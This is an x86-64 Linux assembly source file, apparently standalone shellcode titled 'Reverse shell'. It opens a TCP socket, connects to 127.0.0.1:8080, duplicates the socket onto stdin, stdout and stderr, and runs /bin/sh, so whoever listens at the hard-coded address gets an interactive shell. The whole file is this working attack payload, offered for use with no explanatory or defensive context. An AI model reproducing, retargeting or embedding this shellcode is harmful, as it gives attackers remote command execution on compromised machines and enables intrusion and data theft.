;; Reverse shell by unkw 2021-05-08

global _start
_start:
;sock_fd = socket(AF_INET, SOCK_STREAM, 0)
	push byte 41
	pop rax
	push 2
	pop rdi
	mov esi, edi
	dec esi
	xor edx, edx
	syscall
;connect(sock_fd, 127.0.0.1:8080, sizeof(struct sockaddr_in))
	mov edi, eax
	mov rbx, 0x0100007f901f0002
	push rbx
	push rsp
	pop rsi 
	push byte 16
	pop rdx
	push byte 42
	pop rax
	syscall
;dup(sock_fd, stdin, 0)
	xor esi, esi 
	xor edx, edx
	push byte 33
	pop rax
	syscall
;dup(sock_fd, stdout, 0)
	inc esi
	push byte 33
	pop rax
	syscall
;dup(sock_fd, stderr, 0)
	inc esi
	push byte 33
	pop rax
	syscall
;execve('/bin/sh', NULL, NULL)
	jmp store
back:
	pop rdi
	push byte 59
	pop rax
	xor esi, esi
	mov edx, esi
	syscall
store:
	call back
	db "/bin/sh", 0
